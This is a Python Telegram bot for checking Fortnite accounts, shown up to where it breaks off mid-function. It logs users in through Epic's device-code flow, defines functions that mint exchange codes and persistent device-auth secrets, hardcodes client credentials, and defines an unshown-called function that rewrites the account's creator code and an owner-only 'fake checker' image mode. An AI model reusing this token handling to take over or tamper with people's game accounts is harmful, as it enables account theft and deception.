from PIL import Image, ImageDraw, ImageFont, UnidentifiedImageError
import aiohttp
import asyncio
import re
import io
import math
import os
from datetime import datetime
import platform
import json
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, CallbackContext
from telegram import BotCommand
import logging


#AQUI EL ID DEL OWNER PARA UTILIZAR FAKE CHECKER
AUTHORIZED_USER_ID = 00000000

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

os.system("title Code Created By Kayy / discord.gg/KayyShop")

Image.MAX_IMAGE_PIXELS = None

VERIFICATION_COUNT_FILE = "verification_countstele.json"

def load_verification_counts():
    if os.path.exists(VERIFICATION_COUNT_FILE):
        with open(VERIFICATION_COUNT_FILE, "r") as f:
            return json.load(f)
    return {}

def save_verification_counts(counts):
    with open(VERIFICATION_COUNT_FILE, "w") as f:
        json.dump(counts, f)

async def send_webhook_message(webhook_url: str, message: str):
    async with aiohttp.ClientSession() as session:
        webhook_data = {"content": message}
        async with session.post(webhook_url, json=webhook_data) as resp:
            if resp.status != 204:
                print(f"Error sending message to webhook: {resp.status}")

def bool_to_emoji(value):
    return "✅" if value else "❌"

def country_to_flag(country_code):
    if len(country_code) != 2:
        return country_code
    return chr(ord(country_code[0]) + 127397) + chr(ord(country_code[1]) + 127397)

def mask_email(email):
    if "@" in email:
        local_part, domain = email.split("@")
        if len(local_part) > 2:
            masked_local_part = local_part[0] + "*" * (len(local_part) - 2) + local_part[-1]
        elif len(local_part) == 2:
            masked_local_part = local_part[0] + "*"
        else:
            masked_local_part = local_part
        return f"{masked_local_part}@{domain}"
    return email

def mask_account_id(account_id):
    if len(account_id) > 4:
        return account_id[:2] + "*" * (len(account_id) - 4) + account_id[-2:]
    return account_id

SWITCH_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
IOS_TOKEN = "M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU="
idpattern = re.compile(r"athena(.*?):(.*?)_(.*?)")

current_dir = os.path.dirname(__file__)
rarity_backgrounds = {
    "Common": os.path.join(current_dir, "cuadrados", "commun.png"),
    "Uncommon": os.path.join(current_dir, "cuadrados", "uncommun.png"),
    "Rare": os.path.join(current_dir, "cuadrados", "rare.png"),
    "Epic": os.path.join(current_dir, "cuadrados", "epico.png"),
    "Legendary": os.path.join(current_dir, "cuadrados", "legendary.png"),
    "Mythic": os.path.join(current_dir, "cuadrados", "mitico.png"),
    "Icon Series": os.path.join(current_dir, "cuadrados", "idolo.png"),
    "DARK SERIES": os.path.join(current_dir, "cuadrados", "dark.png"),
    "Star Wars Series": os.path.join(current_dir, "cuadrados", "starwars.png"),
    "MARVEL SERIES": os.path.join(current_dir, "cuadrados", "marvel.png"),
    "DC SERIES": os.path.join(current_dir, "cuadrados", "dc.png"),
    "Gaming Legends Series": os.path.join(current_dir, "cuadrados", "serie.png"),
    "Shadow Series": os.path.join(current_dir, "cuadrados", "shadow.png"),
    "Slurp Series": os.path.join(current_dir, "cuadrados", "slurp.png"),
    "Lava Series": os.path.join(current_dir, "cuadrados", "lava.png"),
    "Frozen Series": os.path.join(current_dir, "cuadrados", "hielo.png")
}

rarity_priority = {
    "Mythic": 1,
    "Legendary": 2,
    "Epic": 13,
    "Rare": 14,
    "Uncommon": 15,
    "Common": 16,
    "Icon Series": 11,
    "DARK SERIES": 3,
    "Star Wars Series": 5,
    "MARVEL SERIES": 6,
    "DC SERIES": 12,
    "Gaming Legends Series": 9,
    "Shadow Series": 10,
    "Slurp Series": 4,
    "Lava Series": 7,
    "Frozen Series": 8
}

mythic_ids = [
    "cid_017_athena_commando_m", "cid_028_athena_commando_f", "cid_029_athena_commando_f_halloween", 
    "cid_032_athena_commando_m_medieval", "cid_033_athena_commando_f_medieval", "cid_035_athena_commando_m_medieval", "cid_a_256_athena_commando_f_uproarbraids_8iozw",
    "cid_052_athena_commando_f_psblue", "cid_095_athena_commando_m_founder", "cid_096_athena_commando_f_founder",
    "cid_113_athena_commando_m_blueace", "cid_114_athena_commando_f_tacticalwoodland", "cid_175_athena_commando_m_celestial", "cid_089_athena_commando_m_retrogrey", "cid_085_athena_commando_m_twitch",
    "cid_174_athena_commando_f_carbidewhite", "cid_183_athena_commando_m_modernmilitaryred", "cid_207_athena_commando_m_footballdudea",
    "cid_208_athena_commando_m_footballdudeb", "cid_209_athena_commando_m_footballdudec", "cid_210_athena_commando_f_footballgirla", "cid_030_athena_commando_m_halloween",
    "cid_211_athena_commando_f_footballgirlb", "cid_212_athena_commando_f_footballgirlc", "cid_238_athena_commando_f_footballgirld", 
    "cid_239_athena_commando_m_footballduded", "cid_240_athena_commando_f_plague", "cid_313_athena_commando_m_kpopfashion", "cid_082_athena_commando_m_scavenger", "cid_090_athena_commando_m_tactical",
    "cid_342_athena_commando_m_streetracermetallic", "cid_434_athena_commando_f_stealthhonor", "cid_441_athena_commando_f_cyberscavengerblue", "cid_479_athena_commando_f_davinci", "cid_657_athena_commando_f_techopsblue",
    "cid_478_athena_commando_f_worldcup", "cid_515_athena_commando_m_barbequelarry", "cid_516_athena_commando_m_blackwidowrogue", "cid_657_athena_commando_f_techOpsBlue",
    "cid_619_athena_commando_f_techllama", "cid_660_athena_commando_f_bandageninjablue", "cid_703_athena_commando_m_cyclone", "cid_084_athena_commando_m_assassin", "cid_083_athena_commando_f_tactical",
    "cid_761_athena_commando_m_cyclonespace", "cid_783_athena_commando_m_aquajacket", "cid_964_athena_commando_m_historian_869bc", "cid_084_athena_commando_m_assassin", "cid_039_athena_commando_f_disco",
    "cid_116_athena_commando_m_carbideblack", "eid_ashtonboardwalk", "eid_ashtonsaltlake", "eid_bendy", "eid_bollywood", "eid_chicken", "cid_757_athena_commando_f_wildcat",  "cid_080_athena_commando_m_space", 
    "eid_crackshotclock", "eid_dab", "eid_fireworksspin", "eid_fresh", "eid_griddles", "eid_hiphop01", "eid_iceking", "eid_kpopdance03",
    "eid_macaroon_45lhe", "eid_ridethepony_athena", "eid_robot", "eid_rockguitar", "eid_solartheory", "eid_taketheL", "eid_tapshuffle", "cid_386_athena_commando_m_streetopsstealth", "cid_371_athena_commando_m_speedymidnight",
    "eid_torchsnuffer", "eid_trophycelebrationfncs", "eid_trophycelebration", "eid_twistdaytona", "eid_zest_q1k5v", "founderumbrella",
    "founderglider", "glider_id_001", "glider_id_002_medieval", "glider_id_003_district", "glider_id_004_disco", "glider_id_014_dragon",
    "glider_id_090_celestial", "glider_id_176_blackmondaycape_4p79k", "glider_id_206_donut", "umbrella_snowflake", "glider_warthog",
    "glider_voyager", "bid_001_bluesquire", "bid_002_royaleknight", "bid_004_blackknight", "bid_005_raptor", "bid_025_tactical", "eid_electroshuffle", "cid_850_athena_commando_f_skullbritecube",
    "bid_024_space", "bid_027_scavenger", "bid_029_retrogrey", "bid_030_tacticalrogue", "bid_055_psburnout", "bid_072_vikingmale",
    "bid_103_clawed", "bid_102_buckles", "bid_138_celestial", "bid_468_cyclone", "bid_520_cycloneuniverse", "halloweenscythe",
    "pickaxe_id_013_teslacoil", "pickaxe_id_015_holidaycandycane", "pickaxe_id_021_megalodon", "pickaxe_id_019_heart",
    "pickaxe_id_029_assassin", "pickaxe_id_077_carbidewhite", "pickaxe_id_088_psburnout", "pickaxe_id_116_celestial",
    "pickaxe_id_294_candycane", "pickaxe_id_359_cyclonemale", "pickaxe_id_376_fncs", "pickaxe_id_508_historianmale_6bqsw", "pickaxe_id_011_medieval", "eid_takethel", "eid_floss",
    "pickaxe_id_804_fncss20male", "pickaxe_id_stw007_basic", "pickaxe_lockjaw"
]

class EpicUser:
    def __init__(self, data: dict = {}):
        self.raw = data

        self.access_token = data.get("access_token", "")
        self.expires_in = data.get("expires_in", 0)
        self.expires_at = data.get("expires_at", "")
        self.token_type = data.get("token_type", "")
        self.refresh_token = data.get("refresh_token", "")
        self.refresh_expires = data.get("refresh_expires", "")
        self.refresh_expires_at = data.get("refresh_expires_at", "")
        self.account_id = data.get("account_id", "")
        self.client_id = data.get("client_id", "")
        self.internal_client = data.get("internal_client", False)
        self.client_service = data.get("client_service", "")
        self.display_name = data.get("displayName", "")
        self.app = data.get("app", "")
        self.in_app_id = data.get("in_app_id", "")

class EpicGenerator:
    def __init__(self) -> None:
        self.http: aiohttp.ClientSession
        self.user_agent = f"DeviceAuthGenerator/{platform.system()}/{platform.version()}"
        self.access_token = ""

    async def start(self) -> None:
        self.http = aiohttp.ClientSession(headers={"User-Agent": self.user_agent})
        self.access_token = await self.get_access_token()

    async def get_access_token(self) -> str:
        async with self.http.request(
            method="POST",
            url="https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token",
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Authorization": f"basic {SWITCH_TOKEN}",
            },
            data={
                "grant_type": "client_credentials",
            },
        ) as response:
            data = await response.json()
            return data["access_token"]

    async def create_device_code(self) -> tuple:
        async with self.http.request(
            method="POST",
            url="https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/deviceAuthorization",
            headers={
                "Authorization": f"bearer {self.access_token}",
                "Content-Type": "application/x-www-form-urlencoded",
            },
        ) as response:
            data = await response.json()
            return data["verification_uri_complete"], data["device_code"]

    async def create_exchange_code(self, user: EpicUser) -> str:
        async with self.http.request(
            method="GET",
            url="https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange",
            headers={"Authorization": f"bearer {user.access_token}"},
        ) as response:
            data = await response.json()
            return data["code"]

    async def wait_for_device_code_completion(self, code: str) -> EpicUser:
        while True:
            async with self.http.request(
                method="POST",
                url="https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token",
                headers={
                    "Authorization": f"basic {SWITCH_TOKEN}",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                data={"grant_type": "device_code", "device_code": code},
            ) as request:
                token = await request.json()

                if request.status == 200:
                    break
                else:
                    if (
                        token["errorCode"]
                        == "errors.com.epicgames.account.oauth.authorization_pending"
                    ):
                        pass
                    elif token["errorCode"] == "g":
                        pass
                    else:
                        print(json.dumps(token, sort_keys=False, indent=4))

                await asyncio.sleep(5)

        async with self.http.request(
            method="GET",
            url="https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange",
            headers={"Authorization": f"bearer {token['access_token']}"},
        ) as request:
            exchange = await request.json()

        async with self.http.request(
            method="POST",
            url="https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token",
            headers={
                "Authorization": f"basic {IOS_TOKEN}",
                "Content-Type": "application/x-www-form-urlencoded",
            },
            data={
                "grant_type": "exchange_code",
                "exchange_code": exchange["code"],
            },
        ) as request:
            auth_information = await request.json()

            return EpicUser(data=auth_information)

    async def create_device_auths(self, user: EpicUser) -> dict:
        async with self.http.request(
            method="POST",
            url="https://account-public-service-prod.ol.epicgames.com/"
            f"account/api/public/account/{user.account_id}/deviceAuth",
            headers={
                "Authorization": f"bearer {user.access_token}",
                "Content-Type": "application/json",
            },
        ) as request:
            data = await request.json()

        return {
            "device_id": data["deviceId"],
            "account_id": data["accountId"],
            "secret": data["secret"],
            "user_agent": data["userAgent"],
            "created": {
                "location": data["created"]["location"],
                "ip_address": data["created"]["ipAddress"],
                "datetime": data["created"]["dateTime"],
            },
        }
    

async def get_cosmetic_info(cosmetic_id: str, session: aiohttp.ClientSession) -> dict:
    async with session.get(f"https://fortnite-api.com/v2/cosmetics/br/{cosmetic_id}") as resp:
        if resp.status != 200:
            return {"id": cosmetic_id, "rarity": "Common", "name": "UNKNOWN", "styles": []}
        data = await resp.json()
        rarity = data.get("data", {}).get("rarity", {}).get("displayValue", "Common")
        name = data.get("data", {}).get("name", "UNKNOWN").upper()
        if cosmetic_id.lower() in mythic_ids:
            rarity = "Mythic"
        if name == "UNKNOWN":
            name = cosmetic_id.upper()
        
        return {"id": cosmetic_id, "rarity": rarity, "name": name}


async def download_cosmetic_images(ids: list, session: aiohttp.ClientSession):
    async def _dl(id: str):
        imgpath = f"./cache/{id}.png"
        if not os.path.exists(imgpath) or not os.path.isfile(imgpath) or os.path.getsize(imgpath) == 0:
            urls = [
                f"https://fortnite-api.com/images/cosmetics/br/{id}/icon.png",
                f"https://fortnite-api.com/images/cosmetics/br/{id}/smallicon.png"
            ]
            for url in urls:
                async with session.get(url) as resp:
                    if resp.status == 200:
                        content = await resp.read()
                        with open(imgpath, "wb") as f:
                            f.write(content)
                        logger.info(f"Downloaded image for {id} from {url}")
                        return
                    else:
                        logger.warning(f"Failed to download {id} from {url} with status {resp.status}")
            else:
                with open(imgpath, "wb") as f:
                    f.write(open("./tbd.png", "rb").read())
                logger.warning(f"Image not found for {id}, using placeholder")

    await asyncio.gather(*[_dl(id) for id in ids])


async def set_affiliate(session: aiohttp.ClientSession, account_id: str, access_token: str, affiliate_name: str = "Kaayyy") -> dict:
    async with session.post(
        f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/SetAffiliateName?profileId=common_core",
        headers={
            "Authorization": f"Bearer {access_token}",
            "content-type": "application/json"
        },
        json={"affiliateName": affiliate_name}
    ) as resp:
        if resp.status != 200:
            return f"Error setting affiliate name ({resp.status})"
        else:
            return await resp.json()

async def grabprofile(session: aiohttp.ClientSession, info: dict, profileid: str = "athena") -> dict:
    async with session.post(
        f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{info['account_id']}/client/QueryProfile?profileId={profileid}",
        headers={
            "Authorization": f"bearer {info['access_token']}",
            "content-type": "application/json"
        },
        json={}
    ) as resp:
        if resp.status != 200:
            return f"Error ({resp.status})"
        else:
            profile_data = await resp.json()
            return profile_data

async def createimg(ids: list, session: aiohttp.ClientSession, title: str = None, username: str = "User", sort_by_rarity: bool = False, show_fake_text: bool = False, item_order: list = None, unlocked_styles: dict = None) -> io.BytesIO:
    logger.info(f"Creating image for {username} with {len(ids)} items")

    if not os.path.exists('./cache'):
        os.makedirs('./cache')

    await download_cosmetic_images(ids, session)

    images = []
    info_list = []
    cosmetic_info_tasks = [get_cosmetic_info(id, session) for id in ids]

    for id, info in zip(ids, await asyncio.gather(*cosmetic_info_tasks)):
        imgpath = f"./cache/{id}.png"
        img = Image.open(imgpath)
        if img.size == (1, 1):
                raise IOError("Image is empty")
        info_list.append(info)
        background_path = rarity_backgrounds.get(info["rarity"], rarity_backgrounds["Common"])
        background = Image.open(background_path)
        img = combine_with_background(img, background, info["name"], info["rarity"])
        images.append(img)
        logger.info(f"Processed image for {info['name']} with rarity {info['rarity']}")

    if images:
        if sort_by_rarity:
            sorted_images = [img for _, img in sorted(zip(info_list, images), key=lambda x: rarity_priority.get(x[0]["rarity"], 6))]
        elif item_order:
            sorted_images = [img for _, img in sorted(zip(info_list, images), key=lambda x: item_order.index(get_cosmetic_type(x[0]["id"])) if get_cosmetic_type(x[0]["id"]) in item_order else 999)]
        else:
            sorted_images = images
        combined_image = combine_images(sorted_images, username, len(ids), show_fake_text=show_fake_text)
        f = io.BytesIO()
        combined_image.save(f, "PNG")
        f.seek(0)
        logger.info(f"Created final combined image for {username}")
        return f
    else:
        logger.warning("No images to combine, returning None")
        return None 

async def get_cosmetic_info(cosmetic_id: str, session: aiohttp.ClientSession) -> dict:
    async with session.get(f"https://fortnite-api.com/v2/cosmetics/br/{cosmetic_id}") as resp:
        if resp.status != 200:
            return {"id": cosmetic_id, "rarity": "Common", "name": "Unknown", "styles": []}
        data = await resp.json()
        rarity = data.get("data", {}).get("rarity", {}).get("displayValue", "Common")
        name = data.get("data", {}).get("name", "Unknown")
        if cosmetic_id.lower() in mythic_ids:
            rarity = "Mythic"
        if name == "Unknown":
            name = cosmetic_id
        
        return {"id": cosmetic_id, "rarity": rarity, "name": name,}
 
directorio_actual = os.path.dirname(os.path.abspath(__file__))
FONT_PATH = os.path.join(directorio_actual, "fonts", "font.ttf") 

def combine_with_background(foreground: Image.Image, background: Image.Image, name: str, rarity: str) -> Image.Image:
    logger.info(f"Combining image {name} with background")
    bg = background.convert("RGBA")
    fg = foreground.convert("RGBA")
    fg = fg.resize(bg.size, Image.Resampling.LANCZOS)

    bg.paste(fg, (0, 0), fg)

    draw = ImageDraw.Draw(bg)

    special_rarities = {
        "ICON SERIES", "DARK SERIES", "STAR WARS SERIES","GAMING LEGENDS SERIES", "MARVEL SERIES", "DC SERIES", 
        "SHADOW SERIES", "SLURP SERIES", "LAVA SERIES", "FROZEN SERIES"
    }

    max_font_size = 40
    if rarity.upper() in special_rarities:
        max_font_size *= 2

    min_font_size = 10
    max_text_width = bg.width - 20
    font_size = max_font_size

    name = name.upper()
    while font_size > min_font_size:
        font = ImageFont.truetype(FONT_PATH, size=font_size)
        text_bbox = draw.textbbox((0, 0), name, font=font)
        text_width, text_height = text_bbox[2] - text_bbox[0], text_bbox[3] - text_bbox[1]

        if text_width <= max_text_width:
            break

        font_size -= 1

    font = ImageFont.truetype(FONT_PATH, size=font_size)
    text_bbox = draw.textbbox((0, 0), name, font=font)
    text_width, text_height = text_bbox[2] - text_bbox[0], text_bbox[3] - text_bbox[1]
    text_x = (bg.width - text_width) // 2

    muro_y_position = int(bg.height * 0.80)
    muro_height = bg.height - muro_y_position

    muro = Image.new('RGBA', (bg.width, muro_height), (0, 0, 0, int(255 * 0.7)))
    bg.paste(muro, (0, muro_y_position), muro)

    text_y = muro_y_position + (muro_height - text_height) // 2

    draw.text((text_x, text_y), name, fill="white", font=font)
    
    logger.info(f"Combined image {name} with background successfully")
    return bg



def combine_images(images, username: str, item_count: int, logo_filename="logo.png", show_fake_text: bool = False):
    max_width = 1848
    max_height = 2048

    num_items = len(images)
    base_max_cols = 6
    max_cols = base_max_cols
    num_rows = math.ceil(num_items / max_cols)

    while num_rows > max_cols:
        max_cols += 1
        num_rows = math.ceil(num_items / max_cols)
    
    while num_rows > max_cols:
        max_cols += 1
        num_rows += 1

    item_width = max_width // max_cols
    item_height = max_height // num_rows

    image_size = min(item_width, item_height)
    spacing = 0  

    total_width = max_cols * image_size + (max_cols - 1) * spacing
    total_height = num_rows * image_size + (num_rows - 1) * spacing

    empty_space_height = image_size
    total_height += empty_space_height

    combined_image = Image.new("RGBA", (total_width, total_height), (0, 0, 0, 255))

    for idx, image in enumerate(images):
        col = idx % max_cols
        row = idx // max_cols
        position = (col * (image_size + spacing), row * (image_size + spacing))
        resized_image = image.resize((image_size, image_size))
        combined_image.paste(resized_image, position, resized_image)

    logo = Image.open(logo_filename).convert("RGBA")
    logo_height = int(empty_space_height * 0.6)
    logo_width = int((logo_height / logo.height) * logo.width)
    logo_position = (10, total_height - empty_space_height + (empty_space_height - logo_height) // 2)

    logo = logo.resize((logo_width, logo_height))
    combined_image.paste(logo, logo_position, logo)

    text1 = f"{('Objetos Totales')}: {item_count}"
    text2 = f"{('Checkeado Por')} {username} | {datetime.now().strftime('%d/%m/%y')}"
    text3 = ("t.me/KayySkinCheckerBot")
    max_text_width = total_width - (logo_position[0] + logo_width + 10)
    font_size = logo_height // 3

    font = ImageFont.truetype(FONT_PATH, size=font_size)
    text_bbox1 = font.getbbox(text1)
    text_bbox2 = font.getbbox(text2)
    text_bbox3 = font.getbbox(text3)
    text_width1, text_height1 = text_bbox1[2] - text_bbox1[0], text_bbox1[3] - text_bbox1[1]
    text_width2, text_height2 = text_bbox2[2] - text_bbox2[0], text_bbox2[3] - text_bbox2[1]
    text_width3, text_height3 = text_bbox3[2] - text_bbox3[0], text_bbox3[3] - text_bbox3[1]

    while (text_width1 > max_text_width or text_width2 > max_text_width or text_width3 > max_text_width) and font_size > 8:
        font_size -= 1
        font = ImageFont.truetype(FONT_PATH, size=font_size)
        text_bbox1 = font.getbbox(text1)
        text_bbox2 = font.getbbox(text2)
        text_bbox3 = font.getbbox(text3)
        text_width1, text_height1 = text_bbox1[2] - text_bbox1[0], text_bbox1[3] - text_bbox1[1]
        text_width2, text_height2 = text_bbox2[2] - text_bbox2[0], text_bbox2[3] - text_bbox2[1]
        text_width3, text_height3 = text_bbox3[2] - text_bbox3[0], text_bbox3[3] - text_bbox3[1]

    text_x1 = logo_position[0] + logo_width + 10
    text_y1 = logo_position[1] + (logo_height - text_height1 - text_height2 - text_height3) // 2
    text_x2 = text_x1
    text_y2 = text_y1 + text_height1 + 5
    text_x3 = text_x1
    text_y3 = text_y2 + text_height2 + 5

    draw = ImageDraw.Draw(combined_image)
    draw.text((text_x1, text_y1), text1, fill="white", font=font)
    draw.text((text_x2, text_y2), text2, fill="white", font=font)
    draw.text((text_x3, text_y3), text3, fill="white", font=font)

    return combined_image

async def sort_ids_by_rarity(ids: list, session: aiohttp.ClientSession) -> list:
    cosmetic_info_tasks = [get_cosmetic_info(id, session) for id in ids]
    info_list = await asyncio.gather(*cosmetic_info_tasks)
    sorted_ids = [id for _, id in sorted(zip(info_list, ids), key=lambda x: rarity_priority.get(x[0]["rarity"], 6))]
    return sorted_ids

async def createimg_per_group(groups: dict, session: aiohttp.ClientSession, username: str) -> dict:
    images = {}
    for group, ids in groups.items():
        sorted_ids = await sort_ids_by_rarity(ids, session)
        image_data = await createimg(sorted_ids, session, username=username, sort_by_rarity=True)
        images[group] = io.BytesIO(image_data)
    return images

def filter_mythic_ids(items):
    mythic_items = []
    for item_type, ids in items.items():
        for id in ids:
            if id.lower() in mythic_ids:
                mythic_items.append(id)
    return mythic_items



async def get_external_auths(session: aiohttp.ClientSession, user: EpicUser) -> dict:
    async with session.get(
        f"https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/{user.account_id}/externalAuths",
        headers={"Authorization": f"bearer {user.access_token}"}
    ) as resp:
        if resp.status != 200:
            return []
        external_auths = await resp.json()
        return external_auths
    
async def get_account_info(session: aiohttp.ClientSession, user: EpicUser) -> dict:
    async with session.get(
        f"https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/{user.account_id}",
        headers={"Authorization": f"bearer {user.access_token}"}
    ) as resp:
        if resp.status != 200:
            return {"error": f"Error fetching account info ({resp.status})"}
        account_info = await resp.json()
        if 'email' in account_info:
            account_info['email'] = mask_email(account_info['email'])
        
        creation_date = account_info.get("created", "Unknown")
        if creation_date != "Unknown":
            creation_date = datetime.strptime(creation_date, "%Y-%m-%dT%H:%M:%S.%fZ").strftime("%d/%m/%Y")
        account_info['creation_date'] = creation_date
        
        account_info['externalAuths'] = await get_external_auths(session, user)

        return account_info

async def get_profile_info(session: aiohttp.ClientSession, user: EpicUser) -> dict:
    async with session.post(
        f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{user.account_id}/client/QueryProfile?profileId=common_core&rvn=-1",
        headers={"Authorization": f"bearer {user.access_token}"},
        json={}
    ) as resp:
        if resp.status != 200:
            return {"error": f"Error fetching profile info ({resp.status})"}
        profile_info = await resp.json()
        
        creation_date = profile_info.get("profileChanges", [{}])[0].get("profile", {}).get("created", "Unknown")
        if creation_date != "Unknown":
            creation_date = datetime.strptime(creation_date, "%Y-%m-%dT%H:%M:%S.%fZ").strftime("%d/%m/%Y")
        profile_info['creation_date'] = creation_date
        
        async with session.get(
            f"https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/{user.account_id}/externalAuths",
            headers={"Authorization": f"bearer {user.access_token}"}
        ) as external_resp:
            if external_resp.status != 200:
                profile_info['externalAuths'] = {}
            else:
                external_auths = await external_resp.json()
                profile_info['externalAuths'] = external_auths


        return profile_info
        return account_info
    
async def get_vbucks_info(session: aiohttp.ClientSession, user: EpicUser) -> dict:
    async with session.post(
        f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{user.account_id}/client/QueryProfile?profileId=common_core&rvn=-1",
        headers={
            "Authorization": f"bearer {user.access_token}",
            "Content-Type": "application/json"
        },
        json={}
    ) as resp:
        if resp.status != 200:
            return {"error": f"Error fetching V-Bucks info ({resp.status})"}
        data = await resp.json()
        
        vbucks_categories = [
            "Currency:MtxPurchased",
            "Currency:MtxEarned",
            "Currency:MtxGiveaway",
            "Currency:MtxPurchaseBonus"
        ]
        
        total_vbucks = 0
        
        for item_id, item_data in data.get("profileChanges", [{}])[0].get("profile", {}).get("items", {}).items():
            if item_data.get("templateId") in vbucks_categories:
                total_vbucks += item_data.get("quantity", 0)
        
        return {"totalAmount": total_vbucks}   

async def get_account_stats(session: aiohttp.ClientSession, user: EpicUser) -> dict:
    async with session.post(
        f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{user.account_id}/client/QueryProfile?profileId=athena&rvn=-1",
        headers={
            "Authorization": f"bearer {user.access_token}",
            "Content-Type": "application/json"
        },
        json={}
    ) as resp:
        if resp.status != 200:
            return {"error": f"Error fetching account stats ({resp.status})"}
        data = await resp.json()

        attributes = data.get("profileChanges", [{}])[0].get("profile", {}).get("stats", {}).get("attributes", {})
        account_level = attributes.get("accountLevel", 0)

        past_seasons = attributes.get("past_seasons", [])
        total_wins = sum(season.get("numWins", 0) for season in past_seasons)
        total_matches = sum(
            season.get("numHighBracket", 0) + season.get("numLowBracket", 0) + 
            season.get("numHighBracket_LTM", 0) + season.get("numLowBracket_LTM", 0) + 
            season.get("numHighBracket_Ar", 0) + season.get("numLowBracket_Ar", 0) 
            for season in past_seasons
        )
        try:
            last_login_raw = attributes.get("last_match_end_datetime", 'N/A')
            if last_login_raw != 'N/A':
                last_played_date = datetime.strptime(last_login_raw, "%Y-%m-%dT%H:%M:%S.%fZ")
                last_played_str = last_played_date.strftime("%d/%m/%y")
                days_since_last_played = (datetime.utcnow() - last_played_date).days
                last_played_info = f"{last_played_str} ({days_since_last_played} días)"
            else:
                last_played_info = "LOL +1200 Dias"
        except Exception as e:
            logger.error(f"Error parsing last_match_end_datetime: {e}")
            last_played_info = "LOL +1200 Dias"
        seasons_info = []
        for season in past_seasons:
            season_info = (
                f"Temporada {season.get('seasonNumber', 'Desconocido')}\n"
                f"› Nivel: {season.get('seasonLevel', 'Desconocido')}\n"
                f"› Pase de Batalla comprado: {bool_to_emoji(season.get('purchasedVIP', False))}\n"
                f"› Victorias en la temporada: {season.get('numWins', 0)}\n"
            )   
            seasons_info.append(season_info)

        return {
            "account_level": account_level,
            "total_wins": total_wins,
            "total_matches": total_matches,
            "last_played_info": last_played_info,
            "seasons_info": seasons_info
        }


    
def create_season_messages(seasons_info):
    messages = []
    current_message = "Información de Temporadas Pasadas (BR & ZB)\n"
    message_length = len(current_message)
    
    for season_info in seasons_info:
        if message_length + len(season_info) + 2 > 4096: 
            messages.append(current_message)
            current_message = "Información de Temporadas Pasadas (BR & ZB)\n"
            message_length = len(current_message)
        
        current_message += season_info + "\n\n"
        message_length += len(season_info) + 2 
    

    if message_length > 0:
        messages.append(current_message)
    
    return messages

async def launch(update: Update, context: CallbackContext):
    asyncio.create_task(launch_task(update, context))

async def launch_task(update: Update, context: CallbackContext):
    try:
        epic_generator = EpicGenerator()
        await epic_generator.start()
        device_code_url, device_code = await epic_generator.create_device_code()
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Por favor, autoriza tu cuenta visitando el siguiente enlace: {device_code_url}")

        user = await epic_generator.wait_for_device_code_completion(device_code)
        exchange_code = await epic_generator.create_exchange_code(user)

        path = "C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64"
        launch_command = f"start /d \"{path}\" FortniteLauncher.exe -AUTH_LOGIN=unused -AUTH_PASSWORD={exchange_code} -AUTH_TYPE=exchangecode -epicapp=Fortnite -epicenv=Prod -EpicPortal -epicuserid={user.account_id}"

        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Copia y pega el siguiente comando en la ventana de CMD y presiona enter: \n\n{launch_command}")
    except Exception as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Error al procesar la solicitud: {e}")


async def fetch_user_info(session, username):
    apiUrl = f"https://api.proswapper.xyz/external/name/{username}"
    async with session.get(apiUrl) as response:
        if response.status == 200:
            response_body = await response.text()
            user_info_list = json.loads(response_body)
            return user_info_list
        return None

async def fetch_ranks_info(session, account_id):
    ranksApiUrl = f"https://api.proswapper.xyz/ranks/lookup/id/{account_id}"
    async with session.get(ranksApiUrl) as response:
        if response.status == 200:
            response_body = await response.text()
            ranks_info = json.loads(response_body)
            return ranks_info
        return None

async def userinfo(update: Update, context: CallbackContext):
    asyncio.create_task(userinfo_task(update, context))

async def userinfo_task(update: Update, context: CallbackContext):
    try:
        username = ' '.join(context.args).strip()

        if not username:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="Por favor, proporciona un nombre de usuario. Uso: /userinfo <nombre_de_usuario>")
            return

        async with aiohttp.ClientSession() as session:
            user_info_list = await fetch_user_info(session, username)

            if not user_info_list:
                await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Error al obtener información para el usuario {username}.")
                return

            for user_info in user_info_list:
                account_id = user_info["id"]
                display_name = user_info.get("displayName", "Desconocido")

                response_text = f"Nombre de pantalla: {display_name}\nAccount ID: {account_id}\n"

                psn_auth = user_info.get("externalAuths", {}).get("psn")
                if psn_auth:
                    response_text += f"\nAccount ID PSN: {psn_auth['externalAuthId']}\n"
                    response_text += f"Nombre en pantalla de PSN: {psn_auth['externalDisplayName']}\n"

                nintendo_auth = user_info.get("externalAuths", {}).get("nintendo")
                if nintendo_auth:
                    for auth_id in nintendo_auth["authIds"]:
                        response_text += f"\nAccount ID Nintendo: {auth_id['id']}\n"

                ranks_info = await fetch_ranks_info(session, account_id)

                if ranks_info:
                    for item in ranks_info:
                        ranking_type = item.get("rankingType")
                        current_division_name = item.get("currentDivisionName")
